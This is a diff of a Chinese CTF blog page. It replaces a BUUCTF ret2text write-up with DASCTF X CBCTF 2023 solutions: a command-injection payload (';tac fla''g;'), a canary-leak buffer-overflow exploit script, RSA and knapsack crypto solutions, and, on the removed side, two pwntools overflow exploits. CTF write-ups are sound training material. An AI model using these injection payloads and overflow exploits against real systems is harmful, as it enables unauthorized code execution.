@@ -22,33 +22,32 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text">
+    <meta name="description" content="DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week6-T1">
-<meta property="og:url" content="http://lmarch2.github.com/posts/c63e16b3/index.html">
+<meta property="og:title" content="DASCTF X CBCTF 2023 WP">
+<meta property="og:url" content="http://lmarch2.github.com/posts/ec1aa757/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn 第十一题考点：ret2text">
+<meta property="og:description" content="DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200802192521891.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200802192937904.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20200802192913332.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png">
-<meta property="article:published_time" content="2023-04-01T07:43:53.000Z">
-<meta property="article:modified_time" content="2023-04-01T07:45:09.990Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png">
+<meta property="article:published_time" content="2023-10-27T12:56:45.000Z">
+<meta property="article:modified_time" content="2023-10-27T12:58:29.124Z">
 <meta property="article:author" content="lmarch2">
-<meta property="article:tag" content="ctf BUUCTF">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200802192521891.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/c63e16b3/">
+<link rel="canonical" href="http://lmarch2.github.com/posts/ec1aa757/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/c63e16b3/","path":"posts/c63e16b3/","title":"week6-T1"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/ec1aa757/","path":"posts/ec1aa757/","title":"DASCTF X CBCTF 2023 WP"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week6-T1 | lmarch2'blog</title>
+<title>DASCTF X CBCTF 2023 WP | lmarch2'blog</title>
   
 
 
@@ -148,7 +147,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week-6-T1-bjdctf-2020-babystack"><span class="nav-text">Week 6 T1 bjdctf_2020_babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-X-CBCTF-2023-WP"><span class="nav-text">DASCTF X CBCTF 2023 WP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EASYBOX"><span class="nav-text">EASYBOX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GuestBook"><span class="nav-text">GuestBook</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA"><span class="nav-text">RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CB-backpack"><span class="nav-text">CB backpack</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -286,7 +285,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/c63e16b3/">
+    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/ec1aa757/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
@@ -299,12 +298,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week6-T1 | lmarch2'blog">
+      <meta itemprop="name" content="DASCTF X CBCTF 2023 WP | lmarch2'blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week6-T1
+          DASCTF X CBCTF 2023 WP
         </h1>
 
         <div class="post-meta-container">
@@ -316,7 +315,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-04-01 15:43:53 / 修改时间：15:45:09" itemprop="dateCreated datePublished" datetime="2023-04-01T15:43:53+08:00">2023-04-01</time>
+      <time title="创建时间：2023-10-27 20:56:45 / 修改时间：20:58:29" itemprop="dateCreated datePublished" datetime="2023-10-27T20:56:45+08:00">2023-10-27</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -342,14 +341,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1k</span>
+      <span>4.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>4 分钟</span>
     </span>
 </div>
 
@@ -360,35 +359,33 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
-<p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p>
-</blockquote>
+        <h1 id="DASCTF-X-CBCTF-2023-WP"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅</p>
+<p>最后发现直接就是个web题，在PING函数里面执行system函数命令</p>
 <span id="more"></span>
 
-<p>省略第一步……只开了NX</p>
 <blockquote>
-<p>__isoc99_scanf(“%d”, &amp;nbytes)    让用户输入下次输入时接受的数据的长度</p>
+<p>;tac fla’’g;</p>
 </blockquote>
-<blockquote>
-<p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p>
-</blockquote>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
-<p>找到有&#x2F;bin&#x2F;sh<br>找到后门函数</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
-<p>buf占用的空间为0x10</p>
-<p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
+<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p>
+<p>接着在strcpy中有溢出，直接传payload，被strcpy遇b’\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\x00，然而canary以\x00结尾）</p>
+<p>调试解决发现在  __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零</p>
+<p>于是可以通过多次输入先输入覆盖返回地址和canary除去\x00的七个字符，再给canary补上\x00</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">contextset()</span><br><span class="line"></span><br><span class="line">remo(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line"><span class="comment">#proc(&#x27;./GuestBook&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *0x000000000040143C&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;name:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x17</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">t1 = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pr(t1)</span><br><span class="line">canary0 = ru(<span class="string">b&#x27;How&#x27;</span>)[:-<span class="number">7</span>]</span><br><span class="line">canary = (u64(<span class="string">b&#x27;\x00&#x27;</span>+canary0))</span><br><span class="line">prh(canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00000000004012C3</span></span><br><span class="line">sla(<span class="string">b&#x27;):&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sl(cyclic(<span class="number">0x98</span>)+<span class="string">b&#x27;a&#x27;</span>+canary0+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(system))</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pr(<span class="built_in">type</span>(canary))</span><br><span class="line">pay = cyclic(<span class="number">0x38</span>)<span class="comment">#+p64(canary)+b&#x27;a&#x27;*8+p64(system)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p>
-<p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
-<ul>
-<li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li>
-<li><strong>可用-1进行绕过</strong>，这样用户可输入的数据长度就十分巨大了</li>
-<li>接着调用backdoor()即可getshell</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line"># r = process(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,29891)</span><br><span class="line">elf = ELF(&quot;../buu/bjdctf_2020_babystack&quot;)</span><br><span class="line"></span><br><span class="line">#params</span><br><span class="line">backdoor_addr = elf.symbols[&#x27;backdoor&#x27;]</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">r.recvuntil(b&quot;your name:&quot;)</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">r.recvuntil(b&quot;name?&quot;)</span><br><span class="line">payload = b&#x27;M&#x27; * (0x10 + 8) + p64(backdoor_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>想恢复p,关键在于二次剩余</p>
+<p>加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复</p>
+<p>对于q就更简单,直接求多项式的gcd即可</p>
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"></span><br><span class="line">(e1, noise1, c1) = (<span class="number">1743</span>, <span class="number">44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776</span>, <span class="number">65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983</span>)</span><br><span class="line">(e2, noise2, c2) = (<span class="number">1325</span>, <span class="number">35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683</span>, <span class="number">50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714</span>)</span><br><span class="line">n2 = <span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line">n1 = <span class="number">65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line">str0=<span class="string">&#x27;&#x27;</span><span class="comment">#wp装不下这么长的字符</span></span><br><span class="line"><span class="comment">#legendre_symbol(i,p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line"></span><br><span class="line">F.&lt;x&gt;=PolynomialRing(Zmod(n2))</span><br><span class="line">f1=(x+noise1)^e1-c1</span><br><span class="line">f2=(x+noise2)^e2-c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(GCD(f1,f2))</span></span><br><span class="line"></span><br><span class="line">q=n2-<span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(q.nbits())</span><br><span class="line"></span><br><span class="line">strlist=str0.split(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(strlist)</span></span><br><span class="line">intlist=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> strlist[:-<span class="number">1</span>]]</span><br><span class="line"><span class="comment">#print(intlist)</span></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> intlist:</span><br><span class="line">    <span class="comment">#print(&#x27;test&#x27;+p)</span></span><br><span class="line">    <span class="keyword">if</span> jacobi(i,n1)==<span class="number">1</span>:</span><br><span class="line">        p=<span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">        <span class="comment">#print(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=<span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p,base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(p,base=<span class="number">2</span>)      </span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(ZZ(p).nbits())</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(<span class="number">65537</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br></pre></td></tr></table></figure>
+
+<h2 id="CB-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原</p>
+<p><del>脚本丢了XD</del></p>
+
     </div>
 
     
@@ -415,7 +412,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/c63e16b3/" title="week6-T1">http://lmarch2.github.com/posts/c63e16b3/</a>
+      <a href="http://lmarch2.github.com/posts/ec1aa757/" title="DASCTF X CBCTF 2023 WP">http://lmarch2.github.com/posts/ec1aa757/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -426,7 +423,7 @@
           <div class="post-tags">
 
  <div class="post-tags">
-              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
           </div>
           <script type="text/javascript">
             var tagsall=document.getElementsByClassName("post-tags")
@@ -485,21 +482,18 @@
             </script>
 
 
-              <a href="/tags/ctf-BUUCTF/" rel="tag"><i class="fa fa-tag"></i> ctf BUUCTF</a>
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/95338453/" rel="prev" title="week4&&week5-T5">
-                  <i class="fa fa-chevron-left"></i> week4&&week5-T5
+                <a href="/posts/4b18615c/" rel="prev" title="NSSCTF 2nd wp">
+                  <i class="fa fa-chevron-left"></i> NSSCTF 2nd wp
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/0/" rel="next" title="2023NepCTF WP">
-                  2023NepCTF WP <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
